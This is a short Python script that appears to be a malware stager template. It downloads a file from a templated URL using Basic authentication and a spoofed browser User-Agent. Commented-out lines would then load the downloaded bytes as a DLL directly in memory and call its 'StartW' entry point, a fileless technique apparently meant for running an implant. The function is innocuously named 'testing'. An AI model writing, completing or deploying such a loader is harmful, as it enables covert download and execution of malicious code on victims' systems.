import  urllib.request, urllib, ctypes, ssl, sys, base64

def testing( download_url, username, password ):
    req = urllib.request.Request(download_url)
    creds = ('%s:%s'% (username, password))
    req.add_header('Authorization', 'Basic %s' % base64.b64encode(creds.encode('ascii')).decode('ascii'))
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')

    result = urllib.request.urlopen( req ) 
    buf = result.read()
#    dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
#    startDll = dll.get_proc_addr('StartW')
#    assert startDll()

if __name__=="__main__":
    download_url = "{{https}}"
    testing( download_url, "baduser", "badpassword" )
